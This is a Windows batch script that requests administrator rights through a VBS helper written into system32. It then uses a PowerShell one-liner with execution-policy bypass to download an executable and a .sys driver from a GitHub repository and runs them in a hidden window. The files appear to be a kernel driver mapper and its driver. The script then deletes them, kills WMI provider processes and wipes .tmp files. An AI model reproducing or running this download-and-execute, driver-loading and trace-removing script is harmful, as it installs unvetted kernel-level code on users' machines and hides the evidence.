@echo off
color 0a

echo ==============================
echo =      64TH NEW TEMP          =
echo ==============================
echo.

:: Admin Check and Elevation
:-------------------------------------
NET FILE 1>NUL 2>NUL
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( 
    goto gotAdmin 
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%systemroot%\system32\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%systemroot%\system32\getadmin.vbs"
    "%systemroot%\system32\getadmin.vbs"
    del "%systemroot%\system32\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

echo Loading and executing in memory...
echo [•] Downloading components...

:: Modified version that uses system32 and handles cleanup immediately
powershell -nop -ep bypass -c "$n=New-Object Net.WebClient;$n.Headers.Add('User-Agent','Mozilla/5.0');$e=[System.IO.Path]::Combine($env:systemroot,'system32',[System.IO.Path]::GetRandomFileName()+'.exe');$s=[System.IO.Path]::Combine($env:systemroot,'system32',[System.IO.Path]::GetRandomFileName()+'.sys');try{$n.DownloadFile('https://github.com/63th64t/WOOFER/raw/refs/heads/main/mapper.exe',$e);$n.DownloadFile('https://github.com/63th64t/WOOFER/raw/refs/heads/main/V2.sys',$s);$p=New-Object Diagnostics.ProcessStartInfo;$p.FileName=$e;$p.Arguments='-- \"'+$s+'\"';$p.WindowStyle='Hidden';$proc=[Diagnostics.Process]::Start($p);$proc.WaitForExit();}finally{if(Test-Path $e){Remove-Item $e -Force};if(Test-Path $s){Remove-Item $s -Force}}"
taskkill /im wmiprv* /f /t 2>nul>nul
REM this is fucking annoying wmic caches.
taskkill /im wmiprv* /f /t 2>nul>nul
rem yes im a lazy piece of shit ^^^
echo [✓] Execution completed!
echo [•] Performing instant cleanup...

:: Advanced cleanup with immediate file removal
powershell -c "Stop-Process -Name wmiprvse -Force -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:systemroot\system32\*.tmp -Force | Remove-Item -Force"
timeout /t 1 /nobreak >nul

echo [✓] All done!
pause
exit /B